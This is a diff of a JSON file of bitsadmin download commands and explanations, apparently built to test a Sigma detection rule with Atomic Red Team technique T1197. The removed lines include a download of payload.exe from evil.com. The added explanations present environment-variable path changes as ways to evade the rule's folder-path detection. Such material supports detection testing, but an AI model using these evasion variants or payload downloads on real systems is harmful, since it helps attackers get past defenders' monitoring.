@@ -1,18 +1,14 @@
 [
   {
-    "output": "C:\\Windows\\System32\\bitsadmin.exe /transfer job1 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt \"%TEMP%\\Atomic-license.txt\"",
-    "explanation": "This command uses the same structure as the true positive but replaces the hardcoded path with the %TEMP% environment variable, which is equivalent to AppData\\Local\\Temp. This is a safe mutation technique (recoding with environment variables) that still triggers the Sigma rule."
+    "output": "bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md \"%LOCALAPPDATA%\\bitsadmin3_flag.ps1\"",
+    "explanation": "Replaced the hardcoded path with an environment variable %LOCALAPPDATA% to bypass the rule's folder path detection while maintaining the same behavior."
   },
   {
-    "output": "bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md \"%USERPROFILE%\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1\"",
-    "explanation": "This command uses the %USERPROFILE% environment variable to dynamically resolve to the user's AppData\\Local\\Temp directory. This is a safe mutation technique (recoding with environment variables) that still triggers the Sigma rule."
+    "output": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md \"%TEMP%\\bitsadmin1_flag.ps1\"",
+    "explanation": "Used the %TEMP% environment variable instead of the hardcoded AppData\\Local\\Temp path to avoid matching the suspicious folder pattern in the Sigma rule."
   },
   {
-    "output": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
-    "explanation": "This command is a direct copy of the original command with no changes. It is included to show that the Sigma rule will detect the exact command as written."
-  },
-  {
-    "output": "bitsadmin /transfer myJob /download /priority high http://evil.com/payload.exe payload.exe",
-    "explanation": "This command is a direct copy of the original command with no changes. It is included to show that the Sigma rule will detect the exact command as written."
+    "output": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt \"%USERPROFILE%\\Desktop\\Atomic-license.txt\"",
+    "explanation": "Replaced the hardcoded path with %USERPROFILE%\\Desktop to avoid matching the suspicious folder patterns in the Sigma rule while preserving the intended behavior."
   }
 ]
